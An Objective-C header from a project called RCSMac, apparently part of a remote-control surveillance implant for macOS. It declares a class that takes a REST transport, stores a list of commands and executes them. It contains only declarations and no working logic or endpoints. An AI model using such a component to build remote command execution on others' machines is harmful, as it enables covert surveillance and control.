//
//  CommandsNetworkOperation.h
//  RCSMac
//
//  Created by armored on 1/29/13.
//
//

#import "NetworkOperation.h"
#import "RESTTransport.h"


@interface CommandsNetworkOperation : NSObject <NetworkOperation>
{
@private
  RESTTransport *mTransport;
  NSMutableArray *mCommands;
}

@property (retain,readwrite) NSMutableArray *mCommands;

- (id)initWithTransport: (RESTTransport *)aTransport;
- (void)dealloc;

- (BOOL)executeCommands;

@end